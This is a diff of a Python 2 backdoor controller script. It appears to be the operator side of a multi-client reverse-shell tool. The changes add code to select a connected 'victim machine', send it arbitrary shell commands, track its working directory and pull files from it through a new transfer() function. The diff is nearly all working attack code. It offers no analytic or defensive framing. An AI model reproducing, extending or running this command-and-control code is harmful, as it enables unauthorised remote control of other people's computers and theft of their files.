@@ -2,6 +2,8 @@ import subprocess
 from socket import *
 import time
 import sys, os
+import threading
+import subprocess
 
 """ This module for creating quick backdoors
     servers
@@ -80,6 +82,8 @@ all_addresses   = []  # holds the IP addresses
 
 def get_multiple_clients():
     """This function handles multiple client"""
+
+    global client_conn
     
     for one_conn in all_connections:
 
@@ -110,13 +114,14 @@ def get_multiple_clients():
     
 def backdoor_shell():
 
-      
+      #get_multiple_clients()
       # run while loop to initiate the resverse connection
       while True:
 
          print
          # shell command to be executed
          user_command = raw_input("~$$keyplexer: >>>  ").strip()
+         
           
          # refresh the list to see the new clients
          if user_command == "refresh":
@@ -140,94 +145,87 @@ def backdoor_shell():
                    
               print "\n"
 
-          
 
-         elif ("select" in user_command):
-
-              select = int( user_command.replace("select ", "")) -1
-            
-              if (( select < len(all_addresses)) and (select >= 0)):
-                  interact()
-                  print
-                  print "[+][STATUS] %s | is selected" % str(all_addresses[select])
-                  print
-                  
-                  try:
-                     all_connections[select].send("whoami") # TEST AGAIN
-                     # start the interactive Meterpteter shell 
-                     #path = all_connections[select].recv(4096) + "~$$Meterpreter_Shell >>> " # DONE
-                     path = all_connections[select].recv(4096) + ">"
-                  except:
-                      print
-                      print "[-][ERROR] Client closed connection..........................\n"
-                      break
-
-                  while 1:
-
-                        # send dos commands to the victim machine
-                        dos_commands = raw_input(path)
-
-                        if ((dos_commands != "stop") and ("cd " not in dos_commands) and ("upload " not in dos_commands)):
-                        
-                          try:
-
-                            all_connections[select].send(dos_commands)
-                            message = all_connections[select].recv(4096)
-                            print message
-                            
-                          except:
-
-                            print 
-                            print "[-][ERROR] Client closed connection. stop.........................\n"
-                            break
-                          
-                        elif ("cd " in dos_commands):
-                            # cd command in cmd
-                            
-                            try :
-                              all_connections[select].send(dos_commands)  
-                              message = all_connections[select].recv(4096)
-                              path = message + ">"
-                              
-                            except:
-                              print
-                              print "[-][ERROR] Client close connection..cd........................\n"
-                              break
-
-                        else:
-
-                            print "\n"
-                            break
-
-              else:
-                    # if the command is NOT DOS command exit to the main menu
-                    #print "[+] ERROR: Command is not recognized \n"
-                    print "[-][ERROR] Client does NOT exist ............................\n"
-                   
+         elif("select" in user_command):
+           
+			chosenone = int(user_command.replace("select ","")) - 1
+			
+			if ((chosenone < len(all_addresses)) and (chosenone >= 0 )):
+				print "[INFO] Interacting with %s" % str(all_addresses[chosenone])
+				try:
+					all_connections[chosenone].send("begin") #welcome message
+					vtpath = all_connections[chosenone].recv(4096) + ">" #non blocking socket object / will timeout instantly if no data received
+				except:
+					print "[ERROR] Client closed the connection\n"
+					break;
+				while 1:
+					data=raw_input(vtpath) #raw_input represents the client's sub process's current path
+					if ((data != "stop") and ("cd " not in data) and ("upload " not in data)):
+						try:
+							all_connections[chosenone].send(data)
+							msg=all_connections[chosenone].recv(4096) #non blocking socket object / will timeout instantly if no data received
+							print msg
+						except:
+							print "[ERROR] Client closed the connection\n"
+							break;
+					elif ("cd " in data): #dealing with the cd command
+						try:
+							all_connections[chosenone].send(data)
+							msg=all_connections[chosenone].recv(4096) #non blocking socket object / will timeout instantly if no data received
+							vtpath = msg + ">"
+						except:
+							print "[ERROR] Client closed the connection\n"
+							break;
+					else:
+						print "\n"
+						break
+			else:
+				print "[ERROR] Client doesn't exist\n"
 
 
-                 
-##         elif (user_command == "clear"):
-##                # clears the screen
-##                os.system("clear")
-##
-##
-##         elif (user_command == "help"):
-##              # help menus
-##              print
-##              menu()
-##              #interact()
-##              
-##         elif (user_command == ":kill"):
-##              print "[+] Disconnecting from form the victim machine ----------------"
-##              break
-## 
-##
-##         else:
-##              # Invalid commanfs
-##              print
-##              print bcolors.WARNING + "[ERROR] Invalid Command\n"
-##              
+         elif ("download" in user_command):
+              
+                    transfer(client_conn,user_command)
+                    print "DONE DONWLOAD"
+
+
+         elif (user_command == "clear"):
+                # clears the screen
+                os.system("clear")
+
+
+         elif (user_command == "help"):
+              # help menus
+              print
+              banner()
+              menu()
+              #interact()
+              
+         elif (user_command == ":kill"):
+              print "[+] Disconnecting from form the victim machine ----------------"
+              break
+
+
+         else:
+              # Invalid commanfs
+              print
+              print bcolors.WARNING + "[ERROR] Invalid Command\n"
+              
+
+def transfer(conn,command):
+    
+    conn.send(command)
+    f = open('/home/keyplexer/Desktop/testing.png','wb')
+    while True:  
+        bits = conn.recv(1024)
+        if 'Unable to find out the file' in bits:
+            print '[-] Unable to find out the file'
+            break
+        if bits.endswith('DONE'):
+            print '[+] Transfer completed '
+            f.close()
+            break
+        f.write(bits)
 
 
 class bcolors:
@@ -242,8 +240,6 @@ class bcolors:
     
 
 def main():
-
-   
     	banner()
     	menu()
     	backdoor_shell()
